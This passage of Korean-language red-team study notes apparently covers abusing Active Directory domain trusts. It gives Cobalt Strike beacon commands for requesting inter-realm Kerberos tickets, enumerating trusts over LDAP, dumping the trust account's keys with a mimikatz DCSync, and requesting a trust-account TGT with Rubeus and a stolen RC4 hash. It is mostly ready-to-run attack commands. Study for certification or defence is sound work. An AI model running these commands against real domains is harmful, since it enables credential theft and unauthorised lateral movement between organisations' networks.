beacon> krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]

## Step 10. inter-realm TGT를 통해 Step 5에서 확인한 컴퓨터에 대한 TGS 발급
beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
```
### Outbound Trust
- Trust account에 대한 세션/토큰으로 신뢰받는 도메인에 ldap 질의 가능
```
## Step 1. 신뢰 관계 확인
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

## Step 2. TDO의 GUID 확인
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

## Step 3. TDO 객체의 RC4,AES128,AES256 hash 탈취
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

## Step 4. 신뢰받는 도메인에서 Trust Account의 TGT 요청
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
```

## Reference
- https://github.com/An0nUD4Y/CRTO-Notes
- https://hackmd.io/@_1PdHqbfSHyQw7PmiDCzEg/SyIQaTmIi
